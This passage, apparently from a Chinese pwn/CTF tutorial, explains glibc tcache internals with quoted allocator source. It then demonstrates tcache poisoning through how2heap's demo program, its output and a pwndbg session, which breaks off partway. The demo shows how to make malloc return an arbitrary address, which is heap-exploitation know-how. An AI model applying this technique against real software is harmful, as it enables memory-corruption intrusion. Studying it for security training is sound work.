</pre></div>

<p>再复习一遍 <code>tcache_get()</code> 的源码</p>
<p><div class="codehilite"><pre><span></span><span class="k">static</span> <span class="n">__always_inline</span> <span class="kt">void</span> <span class="o">*</span>
<span class="nf">tcache_get</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">tc_idx</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">tcache_entry</span> <span class="o">*</span><span class="n">e</span> <span class="o">=</span> <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">];</span>
  <span class="n">assert</span> <span class="p">(</span><span class="n">tc_idx</span> <span class="o">&lt;</span> <span class="n">TCACHE_MAX_BINS</span><span class="p">);</span>
  <span class="n">assert</span> <span class="p">(</span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">e</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
  <span class="o">--</span><span class="p">(</span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">counts</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]);</span>
  <span class="k">return</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="n">e</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
在 <code>tcache_get</code> 中，仅仅检查了 <strong>tc_idx</strong> ，此外，我们可以将 tcache 当作一个类似于 fastbin 的单独链表，只是它的check，并没有 fastbin 那么复杂，仅仅检查 <code>tcache-&gt;entries[tc_idx] = e-&gt;next;</code></p>
<h3 id="0x02-tcache-usage">0x02 Tcache Usage<a class="headerlink" href="#0x02-tcache-usage" title="Permanent link">&para;</a></h3>
<ul>
<li>内存存放：</li>
</ul>
<p>可以看到，在free函数的最先处理部分，首先是检查释放块是否页对齐及前后堆块的释放情况，便优先放入tcache结构中。</p>
<div class="codehilite"><pre><span></span><span class="n">_int_free</span> <span class="p">(</span><span class="n">mstate</span> <span class="n">av</span><span class="p">,</span> <span class="n">mchunkptr</span> <span class="n">p</span><span class="p">,</span> <span class="kt">int</span> <span class="n">have_lock</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">INTERNAL_SIZE_T</span> <span class="n">size</span><span class="p">;</span>        <span class="cm">/* its size */</span>
  <span class="n">mfastbinptr</span> <span class="o">*</span><span class="n">fb</span><span class="p">;</span>             <span class="cm">/* associated fastbin */</span>
  <span class="n">mchunkptr</span> <span class="n">nextchunk</span><span class="p">;</span>         <span class="cm">/* next contiguous chunk */</span>
  <span class="n">INTERNAL_SIZE_T</span> <span class="n">nextsize</span><span class="p">;</span>    <span class="cm">/* its size */</span>
  <span class="kt">int</span> <span class="n">nextinuse</span><span class="p">;</span>               <span class="cm">/* true if nextchunk is used */</span>
  <span class="n">INTERNAL_SIZE_T</span> <span class="n">prevsize</span><span class="p">;</span>    <span class="cm">/* size of previous contiguous chunk */</span>
  <span class="n">mchunkptr</span> <span class="n">bck</span><span class="p">;</span>               <span class="cm">/* misc temp for linking */</span>
  <span class="n">mchunkptr</span> <span class="n">fwd</span><span class="p">;</span>               <span class="cm">/* misc temp for linking */</span>

  <span class="n">size</span> <span class="o">=</span> <span class="n">chunksize</span> <span class="p">(</span><span class="n">p</span><span class="p">);</span>

  <span class="cm">/* Little security check which won&#39;t hurt performance: the</span>
<span class="cm">     allocator never wrapps around at the end of the address space.</span>
<span class="cm">     Therefore we can exclude some size values which might appear</span>
<span class="cm">     here by accident or by &quot;design&quot; from some intruder.  */</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">((</span><span class="kt">uintptr_t</span><span class="p">)</span> <span class="n">p</span> <span class="o">&gt;</span> <span class="p">(</span><span class="kt">uintptr_t</span><span class="p">)</span> <span class="o">-</span><span class="n">size</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
      <span class="o">||</span> <span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">misaligned_chunk</span> <span class="p">(</span><span class="n">p</span><span class="p">),</span> <span class="mi">0</span><span class="p">))</span>
    <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">&quot;free(): invalid pointer&quot;</span><span class="p">);</span>
  <span class="cm">/* We know that each chunk is at least MINSIZE bytes in size or a</span>
<span class="cm">     multiple of MALLOC_ALIGNMENT.  */</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="n">size</span> <span class="o">&lt;</span> <span class="n">MINSIZE</span> <span class="o">||</span> <span class="o">!</span><span class="n">aligned_OK</span> <span class="p">(</span><span class="n">size</span><span class="p">)))</span>
    <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">&quot;free(): invalid size&quot;</span><span class="p">);</span>

  <span class="n">check_inuse_chunk</span><span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">p</span><span class="p">);</span>

<span class="cp">#if USE_TCACHE</span>
  <span class="p">{</span>
    <span class="kt">size_t</span> <span class="n">tc_idx</span> <span class="o">=</span> <span class="n">csize2tidx</span> <span class="p">(</span><span class="n">size</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">tcache</span>
  <span class="o">&amp;&amp;</span> <span class="n">tc_idx</span> <span class="o">&lt;</span> <span class="n">mp_</span><span class="p">.</span><span class="n">tcache_bins</span>
  <span class="o">&amp;&amp;</span> <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">counts</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">&lt;</span> <span class="n">mp_</span><span class="p">.</span><span class="n">tcache_count</span><span class="p">)</span>
      <span class="p">{</span>
  <span class="n">tcache_put</span> <span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">tc_idx</span><span class="p">);</span>
  <span class="k">return</span><span class="p">;</span>
      <span class="p">}</span>
  <span class="p">}</span>
<span class="cp">#endif</span>

<span class="p">......</span>
<span class="p">}</span>
</pre></div>

<ul>
<li>内存申请：</li>
</ul>
<p>在内存分配的malloc函数中有多处，会将内存块移入tcache中。</p>
<p>（1）首先，申请的内存块符合fastbin大小时并且找到在fastbin内找到可用的空闲块时，会把该fastbin链上的其他内存块放入tcache中。</p>
<p>（2）其次，申请的内存块符合smallbin大小时并且找到在smallbin内找到可用的空闲块时，会把该smallbin链上的其他内存块放入tcache中。</p>
<p>（3）当在unsorted bin链上循环处理时，当找到大小合适的链时，并不直接返回，而是先放到tcache中，继续处理。</p>
<p>代码太长就不全贴了，贴个符合fastbin 的时候</p>
<div class="codehilite"><pre><span></span>  <span class="k">if</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="p">(</span><span class="n">nb</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="p">(</span><span class="n">get_max_fast</span> <span class="p">()))</span>
    <span class="p">{</span>
      <span class="n">idx</span> <span class="o">=</span> <span class="n">fastbin_index</span> <span class="p">(</span><span class="n">nb</span><span class="p">);</span>
      <span class="n">mfastbinptr</span> <span class="o">*</span><span class="n">fb</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">fastbin</span> <span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">idx</span><span class="p">);</span>
      <span class="n">mchunkptr</span> <span class="n">pp</span><span class="p">;</span>
      <span class="n">victim</span> <span class="o">=</span> <span class="o">*</span><span class="n">fb</span><span class="p">;</span>

      <span class="k">if</span> <span class="p">(</span><span class="n">victim</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">SINGLE_THREAD_P</span><span class="p">)</span>
        <span class="o">*</span><span class="n">fb</span> <span class="o">=</span> <span class="n">victim</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span>
      <span class="k">else</span>
        <span class="nf">REMOVE_FB</span> <span class="p">(</span><span class="n">fb</span><span class="p">,</span> <span class="n">pp</span><span class="p">,</span> <span class="n">victim</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_likely</span> <span class="p">(</span><span class="n">victim</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">))</span>
        <span class="p">{</span>
          <span class="kt">size_t</span> <span class="n">victim_idx</span> <span class="o">=</span> <span class="n">fastbin_index</span> <span class="p">(</span><span class="n">chunksize</span> <span class="p">(</span><span class="n">victim</span><span class="p">));</span>
          <span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">victim_idx</span> <span class="o">!=</span> <span class="n">idx</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
        <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">&quot;malloc(): memory corruption (fast)&quot;</span><span class="p">);</span>
          <span class="n">check_remalloced_chunk</span> <span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">victim</span><span class="p">,</span> <span class="n">nb</span><span class="p">);</span>
<span class="cp">#if USE_TCACHE</span>
          <span class="cm">/* While we&#39;re here, if we see other chunks of the same size,</span>
<span class="cm">         stash them in the tcache.  */</span>
          <span class="kt">size_t</span> <span class="n">tc_idx</span> <span class="o">=</span> <span class="n">csize2tidx</span> <span class="p">(</span><span class="n">nb</span><span class="p">);</span>
          <span class="k">if</span> <span class="p">(</span><span class="n">tcache</span> <span class="o">&amp;&amp;</span> <span class="n">tc_idx</span> <span class="o">&lt;</span> <span class="n">mp_</span><span class="p">.</span><span class="n">tcache_bins</span><span class="p">)</span>
        <span class="p">{</span>
          <span class="n">mchunkptr</span> <span class="n">tc_victim</span><span class="p">;</span>

          <span class="cm">/* While bin not empty and tcache not full, copy chunks.  */</span>
          <span class="k">while</span> <span class="p">(</span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">counts</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">&lt;</span> <span class="n">mp_</span><span class="p">.</span><span class="n">tcache_count</span>
             <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">tc_victim</span> <span class="o">=</span> <span class="o">*</span><span class="n">fb</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
            <span class="p">{</span>
              <span class="k">if</span> <span class="p">(</span><span class="n">SINGLE_THREAD_P</span><span class="p">)</span>
            <span class="o">*</span><span class="n">fb</span> <span class="o">=</span> <span class="n">tc_victim</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span>
              <span class="k">else</span>
            <span class="p">{</span>
              <span class="n">REMOVE_FB</span> <span class="p">(</span><span class="n">fb</span><span class="p">,</span> <span class="n">pp</span><span class="p">,</span> <span class="n">tc_victim</span><span class="p">);</span>
              <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="n">tc_victim</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">))</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="p">}</span>
              <span class="n">tcache_put</span> <span class="p">(</span><span class="n">tc_victim</span><span class="p">,</span> <span class="n">tc_idx</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>
<span class="cp">#endif</span>
          <span class="kt">void</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="n">chunk2mem</span> <span class="p">(</span><span class="n">victim</span><span class="p">);</span>
          <span class="n">alloc_perturb</span> <span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">bytes</span><span class="p">);</span>
          <span class="k">return</span> <span class="n">p</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="p">}</span>
</pre></div>

<ul>
<li>
<p>tcache 取出：在内存申请的开始部分，首先会判断申请大小块，在tcache是否存在，如果存在就直接从tcache中摘取，否则再使用_int_malloc分配。</p>
</li>
<li>
<p>在循环处理unsorted bin内存块是，如果达到放入unsorted bin块最大数量时，会立即返回。默认是0，即不存在上限。</p>
</li>
</ul>
<div class="codehilite"><pre><span></span><span class="cp">#if USE_TCACHE</span>
      <span class="cm">/* If we&#39;ve processed as many chunks as we&#39;re allowed while</span>
<span class="cm">   filling the cache, return one of the cached ones.  */</span>
      <span class="o">++</span><span class="n">tcache_unsorted_count</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">return_cached</span>
    <span class="o">&amp;&amp;</span> <span class="n">mp_</span><span class="p">.</span><span class="n">tcache_unsorted_limit</span> <span class="o">&gt;</span> <span class="mi">0</span>
    <span class="o">&amp;&amp;</span> <span class="n">tcache_unsorted_count</span> <span class="o">&gt;</span> <span class="n">mp_</span><span class="p">.</span><span class="n">tcache_unsorted_limit</span><span class="p">)</span>
  <span class="p">{</span>
    <span class="k">return</span> <span class="n">tcache_get</span> <span class="p">(</span><span class="n">tc_idx</span><span class="p">);</span>
  <span class="p">}</span>
<span class="cp">#endif</span>
</pre></div>

<ul>
<li>在循环处理unsorted bin内存块后，如果之前曾放入过tcache块，则会取出一个并返回。</li>
</ul>
<div class="codehilite"><pre><span></span><span class="cp">#if USE_TCACHE</span>
      <span class="cm">/* If all the small chunks we found ended up cached, return one now.  */</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">return_cached</span><span class="p">)</span>
  <span class="p">{</span>
    <span class="k">return</span> <span class="n">tcache_get</span> <span class="p">(</span><span class="n">tc_idx</span><span class="p">);</span>
  <span class="p">}</span>
<span class="cp">#endif</span>
</pre></div>

<h3 id="0x03-pwn-tcache">0x03 Pwn Tcache<a class="headerlink" href="#0x03-pwn-tcache" title="Permanent link">&para;</a></h3>
<h4 id="tcache-poisoning">tcache poisoning<a class="headerlink" href="#tcache-poisoning" title="Permanent link">&para;</a></h4>
<p>通过覆盖 tcache 中的 next，不需要伪造任何 chunk 结构即可实现 malloc 到任何地址。</p>
<p>以 how2heap 中的 <a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.26/tcache_poisoning.c">tcache_poisoning</a> 为例</p>
<p>看一下源码</p>
<div class="codehilite"><pre><span></span><span class="n">glibc_2</span><span class="mf">.26</span> <span class="p">[</span><span class="n">master</span><span class="err">●</span><span class="p">]</span> <span class="n">bat</span> <span class="n">tcache_poisoning</span><span class="p">.</span><span class="n">c</span>
<span class="err">───────┬─────────────────────────────────────────────────────────────────────────────────</span>
       <span class="err">│</span> <span class="nl">File</span><span class="p">:</span> <span class="n">tcache_poisoning</span><span class="p">.</span><span class="n">c</span>
<span class="err">───────┼─────────────────────────────────────────────────────────────────────────────────</span>
   <span class="mi">1</span>   <span class="err">│</span> <span class="err">#</span><span class="n">include</span> <span class="o">&lt;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
   <span class="mi">2</span>   <span class="err">│</span> <span class="err">#</span><span class="n">include</span> <span class="o">&lt;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
   <span class="mi">3</span>   <span class="err">│</span> <span class="err">#</span><span class="n">include</span> <span class="o">&lt;</span><span class="n">stdint</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
   <span class="mi">4</span>   <span class="err">│</span> 
   <span class="mi">5</span>   <span class="err">│</span> <span class="kt">int</span> <span class="n">main</span><span class="p">()</span>
   <span class="mi">6</span>   <span class="err">│</span> <span class="p">{</span>
   <span class="mi">7</span>   <span class="err">│</span>         <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;This file demonstrates a simple tcache poisoning attack</span>
       <span class="err">│</span>  <span class="n">by</span> <span class="n">tricking</span> <span class="n">malloc</span> <span class="n">into</span><span class="err">\</span><span class="n">n</span><span class="s">&quot;</span>
   <span class="mi">8</span>   <span class="err">│</span>                <span class="s">&quot;returning a pointer to an arbitrary location (in this case, the </span>
       <span class="err">│</span> <span class="n">stack</span><span class="p">).</span><span class="err">\</span><span class="n">n</span><span class="s">&quot;</span>
   <span class="mi">9</span>   <span class="err">│</span>                <span class="s">&quot;The attack is very similar to fastbin corruption attack.</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">);</span>
  <span class="mi">10</span>   <span class="err">│</span> 
  <span class="mi">11</span>   <span class="err">│</span>         <span class="kt">size_t</span> <span class="n">stack_var</span><span class="p">;</span>
  <span class="mi">12</span>   <span class="err">│</span>         <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;The address we want malloc() to return is %p.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span>
       <span class="err">│</span>  <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">stack_var</span><span class="p">);</span>
  <span class="mi">13</span>   <span class="err">│</span> 
  <span class="mi">14</span>   <span class="err">│</span>         <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Allocating 1 buffer.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
  <span class="mi">15</span>   <span class="err">│</span>         <span class="kt">intptr_t</span> <span class="o">*</span><span class="n">a</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">);</span>
  <span class="mi">16</span>   <span class="err">│</span>         <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;malloc(128): %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">a</span><span class="p">);</span>
  <span class="mi">17</span>   <span class="err">│</span>         <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Freeing the buffer...</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
  <span class="mi">18</span>   <span class="err">│</span>         <span class="n">free</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>
  <span class="mi">19</span>   <span class="err">│</span> 
  <span class="mi">20</span>   <span class="err">│</span>         <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Now the tcache list has [ %p ].</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">a</span><span class="p">);</span>
  <span class="mi">21</span>   <span class="err">│</span>         <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;We overwrite the first %lu bytes (fd/next pointer) of t</span>
       <span class="err">│</span> <span class="n">he</span> <span class="n">data</span> <span class="n">at</span> <span class="o">%</span><span class="n">p</span><span class="err">\</span><span class="n">n</span><span class="s">&quot;</span>
  <span class="mi">22</span>   <span class="err">│</span>                 <span class="s">&quot;to point to the location to control (%p).</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">intptr_t</span><span class="p">),</span>
       <span class="err">│</span>  <span class="n">a</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">stack_var</span><span class="p">);</span>
  <span class="mi">23</span>   <span class="err">│</span>         <span class="n">a</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">intptr_t</span><span class="p">)</span><span class="o">&amp;</span><span class="n">stack_var</span><span class="p">;</span>
  <span class="mi">24</span>   <span class="err">│</span> 
  <span class="mi">25</span>   <span class="err">│</span>         <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;1st malloc(128): %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">));</span>
  <span class="mi">26</span>   <span class="err">│</span>         <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Now the tcache list has [ %p ].</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">stack_var</span><span class="p">);</span>
  <span class="mi">27</span>   <span class="err">│</span> 
  <span class="mi">28</span>   <span class="err">│</span>         <span class="kt">intptr_t</span> <span class="o">*</span><span class="n">b</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">);</span>
  <span class="mi">29</span>   <span class="err">│</span>         <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;2st malloc(128): %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">b</span><span class="p">);</span>
  <span class="mi">30</span>   <span class="err">│</span>         <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;We got the control</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
  <span class="mi">31</span>   <span class="err">│</span> 
  <span class="mi">32</span>   <span class="err">│</span>         <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
  <span class="mi">33</span>   <span class="err">│</span> <span class="p">}</span>
<span class="err">───────┴─────────────────────────────────────────────────────────────────────────────────</span>
</pre></div>

<p>运行结果是
<div class="codehilite"><pre><span></span>glibc_2.26 <span class="o">[</span>master●<span class="o">]</span> ./tcache_poisoning 
This file demonstrates a simple tcache poisoning attack by tricking malloc into
returning a pointer to an arbitrary location <span class="o">(</span>in this <span class="k">case</span>, the stack<span class="o">)</span>.
The attack is very similar to fastbin corruption attack.

The address we want malloc<span class="o">()</span> to <span class="k">return</span> is 0x7fff0d28a0c8.
Allocating <span class="m">1</span> buffer.
malloc<span class="o">(</span><span class="m">128</span><span class="o">)</span>: 0x55f666ee1260
Freeing the buffer...
Now the tcache list has <span class="o">[</span> 0x55f666ee1260 <span class="o">]</span>.
We overwrite the first <span class="m">8</span> bytes <span class="o">(</span>fd/next pointer<span class="o">)</span> of the data at 0x55f666ee1260
to point to the location to control <span class="o">(</span>0x7fff0d28a0c8<span class="o">)</span>.
1st malloc<span class="o">(</span><span class="m">128</span><span class="o">)</span>: 0x55f666ee1260
Now the tcache list has <span class="o">[</span> 0x7fff0d28a0c8 <span class="o">]</span>.
2st malloc<span class="o">(</span><span class="m">128</span><span class="o">)</span>: 0x7fff0d28a0c8
We got the control
</pre></div>
分析一下，程序先申请了一个大小是 128 的 chunk，然后 free。128 在 tcache 的范围内，因此 free 之后该 chunk 被放到了 tcache 中，调试如下：
<div class="codehilite"><pre><span></span><span class="nf">pwndbg</span><span class="err">&gt;</span> 
<span class="mi">0x0000555555554815</span>  <span class="mi">18</span>      <span class="no">free</span><span class="p">(</span><span class="no">a</span><span class="p">)</span><span class="c">;</span>
<span class="nl">LEGEND:</span> <span class="nf">STACK</span> <span class="err">|</span> <span class="no">HEAP</span> <span class="err">|</span> <span class="no">CODE</span> <span class="err">|</span> <span class="no">DATA</span> <span class="err">|</span> <span class="no">RWX</span> <span class="err">|</span> <span class="no">RODATA</span>
<span class="err">──────────────────────────────────────[</span> <span class="nf">REGISTERS</span> <span class="p">]</span><span class="err">──────────────────────────────────────</span>
<span class="na">......</span>
 <span class="nf">RDI</span>  <span class="mi">0x555555756260</span> <span class="err">?—</span> <span class="mi">0x0</span>
<span class="na">......</span>
 <span class="nf">RIP</span>  <span class="mi">0x555555554815</span> <span class="p">(</span><span class="no">main</span><span class="err">+</span><span class="mi">187</span><span class="p">)</span> <span class="err">?—</span> <span class="no">call</span>   <span class="mi">0x555555554600</span>
<span class="err">───────────────────────────────────────[</span> <span class="nf">DISASM</span> <span class="p">]</span><span class="err">────────────────────────────────────────</span>
<span class="na">......</span>
 <span class="err">?</span> <span class="err">0</span><span class="nf">x555555554815</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">187</span><span class="err">&gt;</span>    <span class="no">call</span>   <span class="no">free@plt</span> <span class="err">&lt;</span><span class="mi">0x555555554600</span><span class="err">&gt;</span>
        <span class="nl">ptr:</span> <span class="err">0</span><span class="nf">x555555756260</span> <span class="err">?—</span> <span class="mi">0x0</span>
<span class="na">......</span>
<span class="err">────────────────────────────────────[</span> <span class="nf">SOURCE</span> <span class="p">(</span><span class="no">CODE</span><span class="p">)</span> <span class="p">]</span><span class="err">────────────────────────────────────</span>
<span class="na">......</span>
 <span class="err">?</span> <span class="err">18</span>   <span class="nf">free</span><span class="p">(</span><span class="no">a</span><span class="p">)</span><span class="c">;</span>
<span class="na">......</span>
<span class="err">────────────────────────────────────────[</span> <span class="nf">STACK</span> <span class="p">]</span><span class="err">────────────────────────────────────────</span>
<span class="na">......</span>
<span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">ni</span>
<span class="err">20</span>      <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="no">Now</span> <span class="no">the</span> <span class="no">tcache</span> <span class="no">list</span> <span class="no">has</span> <span class="p">[</span> <span class="nv">%p</span> <span class="p">].</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">a</span><span class="p">)</span><span class="c">;</span>
<span class="nl">LEGEND:</span> <span class="nf">STACK</span> <span class="err">|</span> <span class="no">HEAP</span> <span class="err">|</span> <span class="no">CODE</span> <span class="err">|</span> <span class="no">DATA</span> <span class="err">|</span> <span class="no">RWX</span> <span class="err">|</span> <span class="no">RODATA</span>
<span class="err">──────────────────────────────────────[</span> <span class="nf">REGISTERS</span> <span class="p">]</span><span class="err">──────────────────────────────────────</span>
 <span class="nf">RAX</span>  <span class="mi">0x0</span>
 <span class="nf">RBX</span>  <span class="mi">0x0</span>
 <span class="nf">RCX</span>  <span class="mi">0x7</span>
 <span class="nf">RDX</span>  <span class="mi">0x0</span>
 <span class="nf">RDI</span>  <span class="mi">0x1</span>
 <span class="nf">RSI</span>  <span class="mi">0x555555756010</span> <span class="err">?—</span> <span class="mi">0x100000000000000</span>
 <span class="nf">R8</span>   <span class="mi">0x0</span>
 <span class="nf">R9</span>   <span class="mi">0x7fffffffb78c</span> <span class="err">?—</span> <span class="mi">0x1c00000000</span>
 <span class="nf">R10</span>  <span class="mi">0x911</span>
 <span class="nf">R11</span>  <span class="mi">0x7ffff7aa0ba0</span> <span class="p">(</span><span class="no">free</span><span class="p">)</span> <span class="err">?—</span> <span class="no">push</span>   <span class="no">rbx</span>
 <span class="nf">R12</span>  <span class="mi">0x555555554650</span> <span class="p">(</span><span class="no">_start</span><span class="p">)</span> <span class="err">?—</span> <span class="no">xor</span>    <span class="no">ebp</span><span class="p">,</span> <span class="no">ebp</span>
 <span class="nf">R13</span>  <span class="mi">0x7fffffffe0a0</span> <span class="err">?—</span> <span class="mi">0x1</span>
 <span class="nf">R14</span>  <span class="mi">0x0</span>
 <span class="nf">R15</span>  <span class="mi">0x0</span>
 <span class="nf">RBP</span>  <span class="mi">0x7fffffffdfc0</span> <span class="err">—?</span> <span class="mi">0x555555554910</span> <span class="p">(</span><span class="no">__libc_csu_init</span><span class="p">)</span> <span class="err">?—</span> <span class="no">push</span>   <span class="no">r15</span>
 <span class="nf">RSP</span>  <span class="mi">0x7fffffffdfa0</span> <span class="err">—?</span> <span class="mi">0x555555554910</span> <span class="p">(</span><span class="no">__libc_csu_init</span><span class="p">)</span> <span class="err">?—</span> <span class="no">push</span>   <span class="no">r15</span>
 <span class="nf">RIP</span>  <span class="mi">0x55555555481a</span> <span class="p">(</span><span class="no">main</span><span class="err">+</span><span class="mi">192</span><span class="p">)</span> <span class="err">?—</span> <span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span> <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rip</span> <span class="err">+</span> <span class="mi">0x20083f</span><span class="p">]</span>
<span class="err">───────────────────────────────────────[</span> <span class="nf">DISASM</span> <span class="p">]</span><span class="err">────────────────────────────────────────</span>
   <span class="err">0</span><span class="nf">x555555554802</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">168</span><span class="err">&gt;</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,</span> <span class="p">[</span><span class="no">rip</span> <span class="err">+</span> <span class="mi">0x2bd</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x555555554809</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">175</span><span class="err">&gt;</span>    <span class="no">call</span>   <span class="no">fwrite@plt</span> <span class="err">&lt;</span><span class="mi">0x555555554630</span><span class="err">&gt;</span>

   <span class="err">0</span><span class="nf">x55555555480e</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">180</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span> <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">8</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x555555554812</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">184</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span> <span class="no">rax</span>
   <span class="err">0</span><span class="nf">x555555554815</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">187</span><span class="err">&gt;</span>    <span class="no">call</span>   <span class="no">free@plt</span> <span class="err">&lt;</span><span class="mi">0x555555554600</span><span class="err">&gt;</span>

